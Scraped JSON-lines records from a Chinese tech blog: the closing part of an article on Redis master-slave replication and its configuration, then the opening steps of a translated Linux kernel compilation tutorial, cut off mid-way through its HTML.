各场景下复制的选择及优化技巧</h2>\n<p>在介绍了Redis复制的种种细节之后，现在我们可以来总结一下，在下面常见的场景中，何时使用部分复制，以及需要注意哪些问题。</p>\n<h3>（1）第一次建立复制</h3>\n<p>此时全量复制不可避免，但仍有几点需要注意：如果主节点的数据量较大，应该尽量避开流量的高峰期，避免造成阻塞；如果有多个从节点需要建立对主节点的复制，可以考虑将几个从节点错开，避免主节点带宽占用过大。此外，如果从节点过多，也可以调整主从复制的拓扑结构，由一主多从结构变为树状结构（中间的节点既是其主节点的从节点，也是其从节点的主节点）；但使用树状结构应该谨慎：虽然主节点的直接从节点减少，降低了主节点的负担，但是多层从节点的延迟增大，数据一致性变差；且结构复杂，维护相当困难。</p>\n<h3>（2）主节点重启</h3>\n<p>主节点重启可以分为两种情况来讨论，一种是故障导致宕机，另一种则是有计划的重启。</p>\n<p><strong>主节点宕机</strong></p>\n<p>主节点宕机重启后，runid会发生变化，因此不能进行部分复制，只能全量复制。</p>\n<p>实际上在主节点宕机的情况下，应进行故障转移处理，将其中的一个从节点升级为主节点，其他从节点从新的主节点进行复制；且故障转移应尽量的自动化，后面文章将要介绍的哨兵便可以进行自动的故障转移。</p>\n<p><strong>安全重启：debug reload</strong></p>\n<p>在一些场景下，可能希望对主节点进行重启，例如主节点内存碎片率过高，或者希望调整一些只能在启动时调整的参数。如果使用普通的手段重启主节点，会使得runid发生变化，可能导致不必要的全量复制。</p>\n<p>为了解决这个问题，Redis提供了debug reload的重启方式：<strong>重启后，主节点的</strong><strong>runid</strong><strong>和offset</strong><strong>都不受影响，</strong>避免了全量复制。</p>\n<p>如下图所示，debug reload重启后runid和offset都未受影响：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/07/6a0ba809748a0d80d181b9b9c05b10f5.png\" alt=\"\"></p>\n<p>但debug reload是一柄双刃剑：它会清空当前内存中的数据，重新从RDB文件中加载，这个过程会导致主节点的阻塞，因此也需要谨慎。</p>\n<h3>（3）从节点重启</h3>\n<p>从节点宕机重启后，其保存的主节点的runid会丢失，因此即使再次执行slaveof，也无法进行部分复制。</p>\n<h3>（4）网络中断</h3>\n<p>如果主从节点之间出现网络问题，造成短时间内网络中断，可以分为多种情况讨论。</p>\n<p>第一种情况：网络问题时间极为短暂，只造成了短暂的丢包，主从节点都没有判定超时（未触发repl-timeout）；此时只需要通过REPLCONF ACK来补充丢失的数据即可。</p>\n<p>第二种情况：网络问题时间很长，主从节点判断超时（触发了repl-timeout），且丢失的数据过多，超过了复制积压缓冲区所能存储的范围；此时主从节点无法进行部分复制，只能进行全量复制。为了尽可能避免这种情况的发生，应该根据实际情况适当调整复制积压缓冲区的大小；此外及时发现并修复网络中断，也可以减少全量复制。</p>\n<p>第三种情况：介于前述两种情况之间，主从节点判断超时，且丢失的数据仍然都在复制积压缓冲区中；此时主从节点可以进行部分复制。</p>\n<h2>5. 复制相关的配置</h2>\n<p>这一节总结一下与复制有关的配置，说明这些配置的作用、起作用的阶段，以及配置方法等；通过了解这些配置，一方面加深对Redis复制的了解，另一方面掌握这些配置的方法，可以优化Redis的使用，少走坑。</p>\n<p>配置大致可以分为主节点相关配置、从节点相关配置以及与主从节点都有关的配置，下面分别说明。</p>\n<h3>（1）与主从节点都有关的配置</h3>\n<p>首先介绍最特殊的配置，它决定了该节点是主节点还是从节点：</p>\n<p>1)   slaveof &lt;masterip&gt; &lt;masterport&gt;：Redis启动时起作用；作用是建立复制关系，开启了该配置的Redis服务器在启动后成为从节点。该注释默认注释掉，即Redis服务器默认都是主节点。</p>\n<p>2)   repl-timeout 60：与各个阶段主从节点连接超时判断有关，见前面的介绍。</p>\n<h3>（2）主节点相关配置</h3>\n<p>1)   repl-diskless-sync no：作用于全量复制阶段，控制主节点是否使用diskless复制（无盘复制）。所谓diskless复制，是指在全量复制时，主节点不再先把数据写入RDB文件，而是直接写入slave的socket中，整个过程中不涉及硬盘；diskless复制在磁盘IO很慢而网速很快时更有优势。需要注意的是，截至Redis3.0，diskless复制处于实验阶段，默认是关闭的。</p>\n<p>2)   repl-diskless-sync-delay 5：该配置作用于全量复制阶段，当主节点使用diskless复制时，该配置决定主节点向从节点发送之前停顿的时间，单位是秒；只有当diskless复制打开时有效，默认5s。之所以设置停顿时间，是基于以下两个考虑：(1)向slave的socket的传输一旦开始，新连接的slave只能等待当前数据传输结束，才能开始新的数据传输 (2)多个从节点有较大的概率在短时间内建立主从复制。</p>\n<p>3)   client-output-buffer-limit slave 256MB 64MB 60：与全量复制阶段主节点的缓冲区大小有关，见前面的介绍。</p>\n<p>4)   repl-disable-tcp-nodelay no：与命令传播阶段的延迟有关，见前面的介绍。</p>\n<p>5)   masterauth &lt;master-password&gt;：与连接建立阶段的身份验证有关，见前面的介绍。</p>\n<p>6)   repl-ping-slave-period 10：与命令传播阶段主从节点的超时判断有关，见前面的介绍。</p>\n<p>7)   repl-backlog-size 1mb：复制积压缓冲区的大小，见前面的介绍。</p>\n<p>8)   repl-backlog-ttl 3600：当主节点没有从节点时，复制积压缓冲区保留的时间，这样当断开的从节点重新连进来时，可以进行全量复制；默认3600s。如果设置为0，则永远不会释放复制积压缓冲区。</p>\n<p>9)   min-slaves-to-write 3与min-slaves-max-lag 10：规定了主节点的最小从节点数目，及对应的最大延迟，见前面的介绍。</p>\n<h3>（3）从节点相关配置</h3>\n<p>1)   slave-serve-stale-data yes：与从节点数据陈旧时是否响应客户端命令有关，见前面的介绍。</p>\n<p>2)   slave-read-only yes：从节点是否只读；默认是只读的。由于从节点开启写操作容易导致主从节点的数据不一致，因此该配置尽量不要修改。</p>\n<h2>6. 单机内存大小限制</h2>\n<p>在 <a href=\"http://blog.jobbole.com/114093/\" target=\"_blank\">深入学习Redis（2）：持久化</a> 一文中，讲到了fork操作对Redis单机内存大小的限制。实际上在Redis的使用中，限制单机内存大小的因素非常之多，下面总结一下在主从复制中，单机内存过大可能造成的影响：</p>\n<p>（1）切主：当主节点宕机时，一种常见的容灾策略是将其中一个从节点提升为主节点，并将其他从节点挂载到新的主节点上，此时这些从节点只能进行全量复制；如果Redis单机内存达到10GB，一个从节点的同步时间在几分钟的级别；如果从节点较多，恢复的速度会更慢。如果系统的读负载很高，而这段时间从节点无法提供服务，会对系统造成很大的压力。</p>\n<p>（2）从库扩容：如果访问量突然增大，此时希望增加从节点分担读负载，如果数据量过大，从节点同步太慢，难以及时应对访问量的暴增。</p>\n<p>（3）缓冲区溢出：（1）和（2）都是从节点可以正常同步的情形（虽然慢），但是如果数据量过大，导致全量复制阶段主节点的复制缓冲区溢出，从而导致复制中断，则主从节点的数据同步会全量复制-&gt;复制缓冲区溢出导致复制中断-&gt;重连-&gt;全量复制-&gt;复制缓冲区溢出导致复制中断……的循环。</p>\n<p>（4）超时：如果数据量过大，全量复制阶段主节点fork+保存RDB文件耗时过大，从节点长时间接收不到数据触发超时，主从节点的数据同步同样可能陷入全量复制-&gt;超时导致复制中断-&gt;重连-&gt;全量复制-&gt;超时导致复制中断……的循环。</p>\n<p>此外，主节点单机内存除了绝对量不能太大，其占用主机内存的比例也不应过大：最好只使用50%-65%的内存，留下30%-45%的内存用于执行bgsave命令和创建复制缓冲区等。</p>\n<h2>7. info Replication</h2>\n<p>在Redis客户端通过info Replication可以查看与复制相关的状态，对于了解主从节点的当前状态，以及解决出现的问题都会有帮助。</p>\n<p>主节点：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/07/8a91b888c025f2ff104cfca78009de3c.png\" alt=\"\"></p>\n<p>从节点：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/07/9c94677975e945dc3d9caf2dcc75f130.png\" alt=\"\"></p>\n<p>对于从节点，上半部分展示的是其作为从节点的状态，从connectd_slaves开始，展示的是其作为潜在的主节点的状态。</p>\n<p>info Replication中展示的大部分内容在文章中都已经讲述，这里不再详述。</p>\n<h1>七、总结</h1>\n<p>下面回顾一下本文的主要内容：</p>\n<p>1、主从复制的作用：宏观的了解主从复制是为了解决什么样的问题，即数据冗余、故障恢复、读负载均衡等。</p>\n<p>2、主从复制的操作：即slaveof命令。</p>\n<p>3、主从复制的原理：主从复制包括了连接建立阶段、数据同步阶段、命令传播阶段；其中数据同步阶段，有全量复制和部分复制两种数据同步方式；命令传播阶段，主从节点之间有PING和REPLCONF ACK命令互相进行心跳检测。</p>\n<p>4、应用中的问题：包括读写分离的问题（数据不一致问题、数据过期问题、故障切换问题等）、复制超时问题、复制中断问题等，然后总结了主从复制相关的配置，其中repl-timeout、client-output-buffer-limit slave等对解决Redis主从复制中出现的问题可能会有帮助。</p>\n<p>主从复制虽然解决或缓解了数据冗余、故障恢复、读负载均衡等问题，但其缺陷仍很明显：故障恢复无法自动化；写操作无法负载均衡；存储能力受到单机的限制；这些问题的解决，需要哨兵和集群的帮助，我将在后面的文章中介绍，欢迎关注。</p>\n<h1>参考文献</h1>\n<p>《Redis开发与运维》</p>\n<p>《Redis设计与实现》</p>\n<p>《Redis实战》</p>\n<blockquote class=\"wp-embedded-content\" data-secret=\"CFj9egBfO0\"><p><a href=\"http://mdba.cn/2015/03/16/redis%e5%a4%8d%e5%88%b6%e4%b8%ad%e6%96%ad%e9%97%ae%e9%a2%98-%e6%85%a2%e6%9f%a5%e8%af%a2/\">redis主从复制（1）— 慢查询导致复制中断</a></p></blockquote>\n<p><iframe class=\"wp-embedded-content\" sandbox=\"allow-scripts\" security=\"restricted\" style=\"position: absolute; clip: rect(1px, 1px, 1px, 1px);\" src=\"http://mdba.cn/2015/03/16/redis%e5%a4%8d%e5%88%b6%e4%b8%ad%e6%96%ad%e9%97%ae%e9%a2%98-%e6%85%a2%e6%9f%a5%e8%af%a2/embed/#?secret=CFj9egBfO0\" data-secret=\"CFj9egBfO0\" width=\"600\" height=\"338\" title=\"《redis主从复制（1）— 慢查询导致复制中断》—DBA的罗浮宫\" frameborder=\"0\" marginwidth=\"0\" marginheight=\"0\" scrolling=\"no\"></iframe></p>\n<blockquote class=\"wp-embedded-content\" data-secret=\"JuAJkx6Lpr\"><p><a href=\"https://redislabs.com/blog/top-redis-headaches-for-devops-replication-buffer/\">Top Redis Headaches for Devops – Replication Buffer</a></p></blockquote>\n<p><iframe class=\"wp-embedded-content\" sandbox=\"allow-scripts\" security=\"restricted\" style=\"position: absolute; clip: rect(1px, 1px, 1px, 1px);\" src=\"https://redislabs.com/blog/top-redis-headaches-for-devops-replication-buffer/embed/#?secret=JuAJkx6Lpr\" data-secret=\"JuAJkx6Lpr\" width=\"600\" height=\"338\" title=\"“Top Redis Headaches for Devops – Replication Buffer” — Redis Labs\" frameborder=\"0\" marginwidth=\"0\" marginheight=\"0\" scrolling=\"no\"></iframe></p>\n<blockquote class=\"wp-embedded-content\" data-secret=\"KtHjsj0weV\"><p><a href=\"http://mdba.cn/2015/03/17/redis%e4%b8%bb%e4%bb%8e%e5%a4%8d%e5%88%b6%ef%bc%882%ef%bc%89-replication-buffer%e4%b8%8ereplication-backlog/\">redis主从复制（2）— replication buffer与replication backlog</a></p></blockquote>\n<p><iframe class=\"wp-embedded-content\" sandbox=\"allow-scripts\" security=\"restricted\" style=\"position: absolute; clip: rect(1px, 1px, 1px, 1px);\" src=\"http://mdba.cn/2015/03/17/redis%e4%b8%bb%e4%bb%8e%e5%a4%8d%e5%88%b6%ef%bc%882%ef%bc%89-replication-buffer%e4%b8%8ereplication-backlog/embed/#?secret=KtHjsj0weV\" data-secret=\"KtHjsj0weV\" width=\"600\" height=\"338\" title=\"《redis主从复制（2）— replication buffer与replication backlog》—DBA的罗浮宫\" frameborder=\"0\" marginwidth=\"0\" marginheight=\"0\" scrolling=\"no\"></iframe></p>\n<p><a href=\"https://github.com/antirez/redis/issues/918\">https://github.com/antirez/redis/issues/918</a></p>\n<p>https://blog.csdn.net/qbw2010/article/details/50496982</p>\n<p>https://mp.weixin.qq.com/s?__biz=MzIxMzEzMjM5NQ==&amp;mid=2651029484&amp;idx=1&amp;sn=5882f4c7c390a0a0e4f6dfd872e203b5&amp;chksm=8c4caae8bb3b23fe77909e307d45a071186f55069e5207602c61383eab573885615c1d835904&amp;mpshare=1&amp;scene=1&amp;srcid=0327SokqtxEY3WojWNDMHLYl#rd</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"114194\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"114194votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"114194\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i>  收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "tags": "IT技术,Redis,数据库", "url": "http://blog.jobbole.com/114194/", "url_obj_id": "aa95d1c9ae4721218650bfa651e5af8c"}
{"front_img_url": ["http://jbcdn2.b0.upaiyun.com/2018/01/1b8322e1daff605d71fc81e724421f17.jpg"], "title": "如何编译 Linux 内核", "create_date": "2018/05/25 ·", "praise_num": 2, "fav_num": 2, "comment_num": 0, "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"https://www.linux.com/learn/intro-to-linux/2018/4/how-compile-linux-kernel-0\">Jack Wallen</a>   译文出处：<a target=\"_blank\" href=\"https://linux.cn/article-9665-1.html\">Linux中国/Luke</a>   </div><p>曾经有一段时间，升级 Linux 内核让很多用户打心里有所畏惧。在那个时候，升级内核包含了很多步骤，也需要很多时间。现在，内核的安装可以轻易地通过像 <code>apt</code> 这样的包管理器来处理。通过添加特定的仓库，你能很轻易地安装实验版本的或者指定版本的内核（比如针对音频产品的实时内核）。</p>\n<p>考虑一下，既然升级内核如此容易，为什么你不愿意自行编译一个呢？这里列举一些可能的原因：</p>\n<ul>\n<li>你想要简单了解编译内核的过程</li>\n<li>你需要启用或者禁用内核中特定的选项，因为它们没有出现在标准选项里</li>\n<li>你想要启用标准内核中可能没有添加的硬件支持</li>\n<li>你使用的发行版需要你编译内核</li>\n<li>你是一个学生，而编译内核是你的任务</li>\n</ul>\n<p>不管出于什么原因，懂得如何编译内核是非常有用的，而且可以被视作一个通行权。当我第一次编译一个新的 Linux 内核（那是很久以前了），然后尝试从它启动，我从中（系统马上就崩溃了，然后不断地尝试和失败）感受到一种特定的兴奋。</p>\n<p>既然这样，让我们来实验一下编译内核的过程。我将使用 Ubuntu 16.04 Server 来进行演示。在运行了一次常规的 <code>sudo apt upgrade</code> 之后，当前安装的内核版本是 <code>4.4.0-121</code>。我想要升级内核版本到 <code>4.17</code>， 让我们小心地开始吧。</p>\n<p>有一个警告：强烈建议你在虚拟机里实验这个过程。基于虚拟机，你总能创建一个快照，然后轻松地从任何问题中回退出来。不要在产品机器上使用这种方式升级内核，除非你知道你在做什么。</p>\n<h3 id=\"toc_1\">下载内核</h3>\n<p>我们要做的第一件事是下载内核源码。在 <a href=\"https://www.kernel.org/\">Kernel.org</a> 找到你要下载的所需内核的 URL。找到 URL 之后，使用如下命令（我以 <code>4.17 RC2</code> 内核为例） 来下载源码文件:</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa92f3bd73884727049\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nwget https://git.kernel.org/torvalds/t/linux-4.17-rc2.tar.gz\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa92f3bd73884727049-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa92f3bd73884727049-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa92f3bd73884727049-1\"><span class=\"crayon-e\">wget </span><span class=\"crayon-v\">https</span><span class=\"crayon-o\">:</span><span class=\"crayon-c\">//git.kernel.org/torvalds/t/linux-4.17-rc2.tar.gz</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa92f3bd73884727049-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>在下载期间，有一些事需要去考虑。</p>\n<h3 id=\"toc_2\">安装需要的环境</h3>\n<p>为了编译内核，我们首先得安装一些需要的环境。这可以通过一个命令来完成：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa92f3bd7d219315897\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nsudo apt-get install git fakeroot build-essential ncurses-dev xz-utils libssl-dev bc flex libelf-dev bison\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa92f3bd7d219315897-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa92f3bd7d219315897-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa92f3bd7d219315897-1\"><span class=\"crayon-e\">sudo </span><span class=\"crayon-v\">apt</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">get </span><span class=\"crayon-e\">install </span><span class=\"crayon-e\">git </span><span class=\"crayon-e\">fakeroot </span><span class=\"crayon-v\">build</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">essential </span><span class=\"crayon-v\">ncurses</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">dev </span><span class=\"crayon-v\">xz</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">utils </span><span class=\"crayon-v\">libssl</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">dev </span><span class=\"crayon-e\">bc </span><span class=\"crayon-e\">flex </span><span class=\"crayon-v\">libelf</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">dev </span><span class=\"crayon-i\">bison</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa92f3bd7d219315897-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0008 seconds] -->\r\n<p>务必注意：你将需要至少 128GB 的本地可用磁盘空间来完成内核的编译过程。因此你必须确保有足够的空间。</p>\n<h3 id=\"toc_3\">解压源码</h3>\n<p>在新下载的内核所在的文件夹下，使用该命令来解压内核：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa92f3bd81336757826\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ntar xvzf linux-4.17-rc2.tar.gz\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa92f3bd81336757826-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa92f3bd81336757826-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa92f3bd81336757826-1\"><span class=\"crayon-e\">tar </span><span class=\"crayon-e\">xvzf </span><span class=\"crayon-v\">linux</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">4.17</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">rc2</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">tar</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">gz</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa92f3bd81336757826-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>使用命令 <code>cd linux-4.17-rc2</code> 进入新生成的文件夹。</p>\n<h3 id=\"toc_4\">配置内核</h3>\n<p>在正式编译内核之前，我们首先必须配置需要包含哪些模块。实际上，有一些非常简单的方式来配置。使用一个命令，你能拷贝当前内核的配置文件，然后使用可靠的 <code>menuconfig</code> 命令来做任何必要的更改。使用如下命令来完成：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa92f3bd84149716771\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ncp /boot/config-$(uname -r) .config\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa92f3bd84149716771-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa92f3bd84149716771-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" 